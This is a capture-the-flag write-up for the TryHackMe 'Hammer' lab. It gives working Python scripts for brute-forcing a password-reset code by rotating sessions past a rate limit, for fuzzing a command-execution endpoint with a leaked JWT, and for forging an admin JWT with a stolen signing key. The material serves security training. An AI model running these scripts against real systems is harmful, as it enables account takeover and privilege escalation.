<div style="display:flex; align-items:center; gap:10px;">
    <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62a7685ca6e7ce005d3f3afe-1723567516578" width="150">
    <div>
        <h1  style="align=left; margin-down: 0;">Hammer</h1>
        <p >Use your exploitation skills to bypass authentication mechanisms on a website and get RCE.</p>        
            <img src="https://img.shields.io/badge/Platform-TryHackMe-blue?style=flat-square" alt="Platform">
            <img src="https://img.shields.io/badge/Level-Medium-orange?style=flat-square" alt="Level">
            <img src="https://img.shields.io/badge/Category-Web-green?style=flat-square" alt="Category">  
    </div>
</div>

<blockquote style="margin-top: 6px;"> By <strong>Nelson Hirt</strong></blockquote>



## 1. Machine Overview

* [https://tryhackme.com/room/hammer](https://tryhackme.com/room/hammer)
* Exploit web vulnerabilities to bypass authentication mechanisms and achieve Remote Code Execution (RCE).

> [!IMPORTANT]
> After spawning the machine, map the target IP to the local hostname to ensure all scripts and links work correctly.

```bash
echo "<TARGET_IP> hammer.thm" | sudo tee -a /etc/hosts
```

### Lab Objectives:

* Challenge 1: What is the value of the "flag" displayed immediately after a successful login to the control panel?
* Challenge 2: What is the content of the protected file located at /home/ubuntu/flag.txt?

## 2. Reconnaissance

### Network Connectivity
The first step was to verify connectivity with the target machine and confirm the IP mapping in the `/etc/hosts` file.

> Testing connection
```bash
ping -c 3 hammer.thm

PING hammer.thm (10.64.169.209) 56(84) bytes of data.
64 bytes from hammer.thm (10.64.169.209): icmp_seq=1 ttl=62 time=150 ms

```
> Port scanner
```bash
sudo nmap -Pn -n -sS 10.64.169.209 --top-ports 10000 --min-rate 1000

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-19 19:32 -0300
Nmap scan report for 10.64.169.209
Host is up (0.16s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  

```
> Infrastructure information
```bash
whatweb http://hammer.thm:1337

http://hammer.thm:1337 [200 OK] Apache[2.4.41], Bootstrap, Cookies[PHPSESSID], 
Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
IP[10.64.169.209], PasswordField[password], Title[Login]

```

> [!NOTE] Summary
The web service identified by whatweb operates on the unconventional port 1337, featuring a functional login page under the HTTP 200 protocol. The backend is PHP-based, as evidenced by the PHPSESSID session cookie, and the frontend utilizes the Bootstrap framework in HTML5. The entire application is hosted on an Apache 2.4.41 server running on Ubuntu Linux. The presence of a password field indicates an authentication-focused attack surface, while the software versions suggest a relatively modern Linux environment (likely Ubuntu 20.04).

> Login page - Port 1337

![login page](./images/login.png)

> Source Code 
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
	<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-4">
            <h3 class="text-center">Login</h3>
                        <form method="POST" action="">
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="text" class="form-control" id="email" name="email" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <div class="mt-3 text-center">
                    <a href="reset_password.php">Forgot your password?</a>
                </div>
            </form>
        </div>
    </div>
</div>
</body>
</html>
```
> [!NOTE] Summary
Development comment in the source code revealing the server's naming convention: hmr_DIRECTORY_NAME. This indicates that directories use the hmr_ prefix, as previously observed with the /hmr_css/ folder.

> Fuzzing

```bash
ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hammer.thm:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
________________________________________________

css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 151ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 158ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 158ms]
logs                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 155ms]
:: Progress: [4614/4614] :: Job [1/1] :: 253 req/sec :: Duration: [0:00:21] :: Errors: 0 ::

```
> Exfiltration logs

```log

[http://hammer.thm:1337/hmr_logs/error.logs](http://hammer.thm:1337/hmr_logs/error.logs) 

[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-

```
> [!NOTE] FFUF found four directories, and the structure is exactly what the dev note suggested:
> * hmr_logs: This is the most interesting one. The logs revealed:
> * Valid email: `tester@hammer.thm`
> * The directories /hmr_images/, /hmr_js/, and /hmr_css/ do not contain any custom or sensitive files.


## 3 Exploitation

> Testing login page

![login page](./images/login2.png)

> Generic response

![login page](./images/login_response.png)

> [!NOTE] Change of direction
> The page displays a generic error message for both email and password inputs. Since it doesn't specify which
> credential is incorrect, email enumeration via brute force is not feasible.

> Reset password page

![reset page](./images/reset_page.png)
---


> Source Code Reset Password Page
 
<details>
  <summary><b>Click to view Reset Password Source Code</b></summary>

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
     <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hrm_js/jquery-3.6.0.min.js"></script>
	    <script>
	let countdownv = ;
        function startCountdown() {
            
            let timerElement = document.getElementById("countdown");
			const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
				 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
					//alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-4">
            
                            <h3 class="text-center">Reset Password</h3>
                <form method="POST" action="">
                    <div class="mb-3">
                        <label for="email" class="form-label">Email</label>
                        <input type="text" class="form-control" id="email" name="email" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Submit</button> 
                </form>

                    </div>
    </div>
</div>
</body>
</html>

```
</details>

---
---

> [!IMPORTANT] Source Code Analysis Summary:
Client-Side Logic Flaw: The `startCountdown` function updates a hidden input field (`id="s"`). If the server relies on this field to validate session expiration, it can be manipulated by the user to bypass timeout restrictions.
Endpoint Interaction: The password reset form points to the current page via `POST`, serving as the primary entry point for testing the leaked email `tester@hammer.thm`.
---
---

> BurpSuite capture process

<details>
    <summary><b>Clik to open the images</b></summary>

![alt text](./images/image-4.png)

![alt text](./images/image-5.png)

![alt text](./images/image-6.png)

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
     <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hrm_js/jquery-3.6.0.min.js"></script>
	    <script>
	let countdownv = 180;
        function startCountdown() {
            
            let timerElement = document.getElementById("countdown");
			const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
				 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
					//alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-4">
            
                            <h3 class="text-center">Enter Recovery Code</h3>
                <p id="countdown">You can enter your code in 180 seconds.</p>
                <form method="POST" action="">
                    <div class="mb-3">
                        <label for="recovery_code" class="form-label">4-Digit Code</label>
                        <input type="text" class="form-control" id="recovery_code" name="recovery_code" required>
						  <input type="hidden" class="form-control" id="s" name="s" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Submit Code</button> 
					<p></p>
					<button type="button" class="btn btn-primary w-100" style="background-color: red; border-color: red;" onclick="window.location.href='logout.php';">Cancel</button>

                </form>
                <script>startCountdown();</script>

                    </div>
    </div>
</div>
</body>
</html>

```
![alt text](./images/image-7.png)

![alt text](./images/image-8.png)

</details>

---

### **Exploitation Phase: Password Reset Bypass**

### 🔍 **User Enumeration**
A `POST` request confirmed the existence of `tester@hammer.thm` via a **302 Redirect**, triggering the delivery of a 4-digit recovery code.

### 🔄 **Rate Limit Bypass (Session Rotation)**
The **`Rate-Limit-Pending`** protection is tied to the **PHPSESSID** rather than the user account. Since the recovery code is persistent in the database but the attempt counter is volatile (session-bound), rotating the session cookie every 10 attempts completely resets the rate limit.

### ⏳ **Time-Window Manipulation**
The 180-second expiration is managed via a user-controlled hidden field (`name="s"`). Manipulating this value allows the attacker to arbitrarily extend the session life.

### 🚀 **Attack Execution**
By automating session renewal and static time-parameter injection, the 10,000 possible combinations for the recovery code can be exhausted without being blocked by the server’s security mechanisms.


 ---
 ---
 ---

### Initiate an attack using Python 

> Script python

```python

import requests

# Target Configuration
URL = 'http://hammer.thm:1337/reset_password.php'
EMAIL_DATA = {'email': 'tester@hammer.thm'}
MAX_CODES = 10000
RESET_INTERVAL = 7
SESSION_TIMEOUT = 10

def new_session():
    """Starts a new session to bypass rate limiting."""
    s = requests.Session()
    r = s.post(URL, data=EMAIL_DATA, timeout=SESSION_TIMEOUT)
    r.raise_for_status()
    return s

def main():
    session = new_session()
    print("[*] Starting Brute Force Attack...")

    for i in range(MAX_CODES):
        # Reset session every 7 attempts to bypass rate limit
        if i > 0 and i % RESET_INTERVAL == 0:
            session = new_session()

        # Format code as 4 digits (e.g., 0001, 0002)
        code = f"{i:04d}"
        payload = {'recovery_code': code, 's': '180'}

        try:
            r = session.post(URL, data=payload, timeout=SESSION_TIMEOUT)
            r.raise_for_status()

            # Success condition: error message is NOT in the response
            if 'Invalid or expired recovery code!' not in r.text:
                print(f"\n[!] SUCCESS! Code found: {code}")
                print(f"[!] Session Cookies: {session.cookies.get_dict()}")
                return 
            
        except requests.RequestException as e:
            print(f"\n[!] Request Error: {e}")
            continue

        # Progress tracker
        print(f"[*] Trying code: {code}", end="\r")

if __name__ == '__main__':
    main()

```


## **Automated Exploit Development**

The following script was developed to automate the recovery code discovery by weaponizing the identified vulnerabilities:

### 🔄 **Session Rotation**
The `new_session()` function performs a `POST` request with the target email to trigger a fresh **PHPSESSID** and reset the `Rate-Limit-Pending` counter.

### ⚖️ **Controlled Interval**
To ensure the rate limit is never reached, the session is renewed every **7 attempts** (defined by `RESET_INTERVAL`).

### ⏱️ **Time-Limit Bypass**
Each payload includes `s: 180`, forcing the server to process the request within a supposedly valid time window.

### 🎯 **Success Detection**
The script monitors the HTTP response body. Since the server returns a specific error for incorrect codes, any variation in the response indicates a successful bypass and code identification.

---

> Discovery of the secret code and valid phpsessid

![alt text](./images/image-9.png)

> Modify the phpsessid

![alt text](./images/image-10.png)

> Logging in with a phpsessid validated by the code

![alt text](./images/image-11.png)

> Accessing the dashboard and capturing the first flag

![alt text](./images/image-12.png)

---

---

> Source code dashboard page

<details>
    <summary><b>Clik to open the source code</b></summary>

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hmr_js/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background: url('/hmr_images/hammer.webp') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            position: relative;
            z-index: 10; /* Make sure the content is above the background */
            background-color: rgba(255, 255, 255, 0.8); /* Slight white background for readability */
            padding: 20px;
            border-radius: 10px;
        }
    </style>	
	    <script>       
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }      
        function checkTrailUserCookie() {
            const trailUser = getCookie('persistentSession');
            if (!trailUser) {          
                window.location.href = 'logout.php';
            }
        }       
        setInterval(checkTrailUserCookie, 1000); 
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h3>Welcome, Thor! - Flag: THM{xxxxxxxxxxx}</h3>
            <p>Your role: user</p>            
            <div>
                <input type="text" id="command" class="form-control" placeholder="Enter command">
                <button id="submitCommand" class="btn btn-primary mt-3">Submit</button>
                <pre id="commandOutput" class="mt-3"></pre>
            </div>            
            <a href="logout.php" class="btn btn-danger mt-3">Logout</a>
        </div>
    </div>
</div>
<script>
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzY2MzA3MDU0LCJleHAiOjE3NjYzMTA2NTQsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.AUeWbc1LOd_ijc0ckQZzCF_fwEqnnnjNzLxORSLiFMU';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
</script>
</body>
</html>

```
</details>

---

> Code analysis
>
> The Dashboard page performs a local check (via JavaScript) for the `persistentSession` cookie. If the cookie is not detected, the application terminates the > session and redirects the user to the login page.
>
> An active JWT Token was found hardcoded in the Dashboard's HTML. This exposure grants immediate access to the user's authorization data.
>
> The dashboard's client-side code leaks the API interaction logic via an AJAX script. It explicitly defines the `execute_command.php` path and the JSON > structure required for command execution.

> JWT.io

![alt text](./images/image-13.png)

> Code Analysis
> 
> The token uses the HS256 algorithm and reveals the location of the validation key on the server via the kid field (/var/www/mykey.key). The iat and exp > fields use Unix format to establish an access duration of exactly 1 hour, while the payload identifies the logged-in user with limited privileges (role: > user), ID 1, and the tester's email.

> BurpSuit - execute_code.php
> 
![alt text](./images/image-14.png)

> Script Python

```python

import requests
import sys

# --- CHECK ARGUMENTS ---
if len(sys.argv) < 4:
    print("\033[93mUsage: python3 fuzz_command.py <URL> <TOKEN> <WORDLIST>\033[0m")
    sys.exit(1)

URL = sys.argv[1]
TOKEN = sys.argv[2]
WORDLIST = sys.argv[3]

HEADERS = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {TOKEN}'
}

def start_fuzz():
    # Initialize session to reuse the TCP connection
    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.set('persistentSession', 'no')

    try:
        with open(WORDLIST, 'r') as f:
            print(f"[*] Starting attack using wordlist: {WORDLIST}")
            print(f"[*] Target URL: {URL}")

            for line in f:
                cmd = line.strip()
                if not cmd:
                    continue
                
                try:
                    # Send payload as JSON
                    resp = session.post(URL, json={"command": cmd}, timeout=5)
                    
                    # Check for authentication failure (Token expired or invalid)
                    if resp.status_code in [401, 403]:
                        print(f"\n[!] Authentication Error (Status {resp.status_code}). Check your JWT Token.")
                        return

                    # Check for successful execution (Presence of "output" key)
                    if "output" in resp.text:
                        try:
                            # Attempt to parse and display only the command output
                            json_data = resp.json()
                            result = json_data.get('output', 'No output field found.')
                            print(f"\n\033[92m[+] SUCCESS: {cmd}\033[0m")
                            print(f"--- OUTPUT ---\n{result}\n--------------")
                        except ValueError:
                            # Fallback if the response is not valid JSON but contains the string
                            print(f"\n\033[92m[+] SUCCESS (Raw Response): {cmd}\033[0m")
                            print(f"{resp.text}\n")
                    else:
                        # Print progress dots for failed attempts
                        print('.', end='', flush=True)

                except requests.exceptions.RequestException:
                    # 'X' represents a connection error or timeout for a specific payload
                    print('X', end='', flush=True)

    except FileNotFoundError:
        print(f"\n[!] Error: Wordlist file '{WORDLIST}' not found.")
    except KeyboardInterrupt:
        print(f"\n[!] Aborted by user.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

if __name__ == "__main__":
    start_fuzz()

```

> Command Fuzz
> 
![alt text](./images/image-15.png)


## **Finding the Attack Vector and Bypassing the Whitelist**

While intercepting requests to the `/execute_command.php` endpoint, I noticed that the server expected a JSON object containing a command. However, when attempting common enumeration commands, I received error messages indicating the presence of a **whitelist** (or a filter for allowed commands).

To efficiently identify which commands were accepted by the system, I developed a Python script to perform **fuzzing** on the endpoint. The script automated the submission of a command wordlist, handled the JWT authentication, and validated the server's responses.

**Fuzzing Results:**
Through this automation, I discovered that the `ls` command was permitted. The server responded with a JSON object containing an `"output"` key, revealing the file structure of the web directory:

![alt text](./images/image-16.png)

## **Exfiltrating the Signing Key for JWT Forgery**

After identifying the file redacted`.key` through RCE enumeration, I successfully downloaded it using `curl`. The file contained a 32-character string: `56058354Redactedfabd7a7d7`.

Analysis of the initial JWT captured during the session revealed that the application uses a hardcoded or local key for signature verification. By obtaining this key, the attack vector shifts from **Command Injection** to **Broken Authentication**.

**Exploitation Strategy:**
With the signing key in hand, I can now forge a custom JWT. By modifying the payload to change the `user_id` to `1` or the `role` to `admin`, and re-signing the token using the exfiltrated key, I can escalate privileges and bypass the application's security boundaries.

![alt text](./images/image-17.png)

To finalize the attack, I leveraged the stolen key to sign a custom-made JWT. The script below automates the creation of this token, ensuring the iat (Issued At) and exp (Expiration) claims are valid, while elevating the role to admin. This forged identity allows for full access to the restricted administrative dashboard.

```python

import jwt
import time

# --- CONFIGURATION ---
SECRET_KEY = '56058redactedredaabd7a7d7'
TARGET_KID = '/var/www/html/REDACTED.key'

def generate_admin_token():
    """
    Crafts a forged JWT token for privilege escalation
    using the exfiltrated signing key.
    """
    
    header = {
        "typ": "JWT",
        "alg": "HS256",
        "kid": TARGET_KID
    }
    
    now = int(time.time())
    
    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": now,
        "exp": now + 3600, # Valid for 1 hour
        "data": {
            "user_id": 1,
            "email": "tester@hammer.thm",
            "role": "admin" # Escalating privileges to administrator
        }
    }

    try:
        # Encode and sign the token with the stolen key
        token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=header)
        
        print("\n\033[92m[+] Admin JWT successfully forged!\033[0m")
        print("-" * 60)
        print(token)
        print("-" * 60)
        print("\033[94m[*] Note: Use this token in your Authorization header.\033[0m\n")
        
    except Exception as e:
        print(f"\033[91m[!] Error generating token: {e}\033[0m")

if __name__ == "__main__":
    generate_admin_token()

```
![alt text](./images/image-18.png)

![alt text](./images/image-19.png)

## The attack on the Hammer laboratory demonstrated a complete exploitation chain, ranging from an injection flaw to the total compromise of the authentication system:

**Reconnaissance and Fuzzing:** Using a custom Python script, I automated the bypass of a command whitelist on the `/execute_command.php` endpoint, identifying that the `ls` command was permitted.
**Exfiltration via RCE:** By leveraging Remote Code Execution, I located and extracted the signing key REDACT.`key` directly from the web root, bypassing Apache server access restrictions.
**Broken Authentication:** Analysis of the JWT revealed the use of the HS256 algorithm. Using the exfiltrated key, I forged a new token with administrative privileges.
**Impact:** This privilege escalation granted full access to the administrative dashboard (`dashboard.php`), resulting in the total compromise of the application and the underlying system.
___
___
___
___
___
# **PWNED! 🚩**
> **By Hirt, Nelson**

```text
  [+] System Compromised
  [+] Admin Access Granted
  [+] All Flags Captured

